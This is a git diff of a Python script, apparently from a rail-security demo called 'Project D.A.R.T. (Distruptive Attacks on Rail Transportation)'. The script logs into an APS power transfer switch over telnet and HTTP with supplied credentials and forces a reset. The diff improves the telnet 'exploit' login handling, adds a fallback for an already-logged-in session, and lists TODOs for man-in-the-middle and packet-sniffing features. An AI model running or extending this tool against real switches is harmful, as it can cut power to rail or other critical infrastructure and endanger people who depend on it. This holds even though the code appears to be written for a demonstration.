@@ -1,10 +1,11 @@
 #A script to reset the APS Power Transfer Switch, used as part of the train demo aka Project D.A.R.T. (Distruptive Attacks on Rail Transportation)
-#Written by Christopher Di-Nozzi
+#Written through a veil of tears.
 
 #TODO
 #Finish implementing spinners in http.
 #Automate MITM functionality????
 #add packet sniffing component
+#better error handling in telnet exploit
 
 import requests #for sending HTTP requests
 from pyfiglet import Figlet #pretty banners
@@ -63,10 +64,10 @@ def exploit_telnet(ip, username,password):
         spinner.text=('[+] Getting data from server...')
         spinner.start()
         res = s.recv(2048)
-        res = res + s.recv(2048)
+        #res = res + s.recv(2048)
         time.sleep(1)
-        #print(res)
-        if res==b'\xff\xfb\x01\n\rUser Name : ':
+        #if res==b'\xff\xfb\x01\n\rUser Name : ':
+        if b'User Name' in res:
             spinner.succeed()
             spinner.text=('[+] Sending username to socket...')
             spinner.start()
@@ -79,6 +80,7 @@ def exploit_telnet(ip, username,password):
             s.recv(100)
             spinner.succeed()
 
+        
             spinner.text=('[+] Sending password to socket...')
             spinner.start()
             time.sleep(1)
@@ -144,7 +146,11 @@ def exploit_telnet(ip, username,password):
                     spinner.succeed()
                     prGreen('[+] Reset successful... break anything good? :^)')
                     break    
-
+        else:
+            spinner.text=("[-] Server didn't ask for username, someone may already be logged in...")
+            spinner.fail()
+            return
+        
         s.close()
 
 #'exploit' http (run a bunch of commands to login and reset the switch)
@@ -256,7 +262,6 @@ def print_menu():
         if i == 1:
             ip = str(input("Enter IP of device: "))
             recon(ip)
-            input("Press any key to return to menu...")
         elif i==2:
             ip = str(input("Enter IP of device: "))
             username = str(input('Enter username: '))
